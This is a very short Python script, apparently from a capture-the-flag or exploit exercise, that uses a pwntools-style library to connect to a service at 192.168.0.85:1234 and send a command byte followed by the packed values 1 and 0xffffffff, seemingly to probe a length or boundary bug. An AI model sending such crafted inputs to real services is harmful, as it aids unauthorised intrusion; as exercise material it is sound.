from PwnIOI import *

s = IOI(['192.168.0.85',1234])
s.write('\x01')
s.write(p32(1))
s.write(p32(0xffffffff))
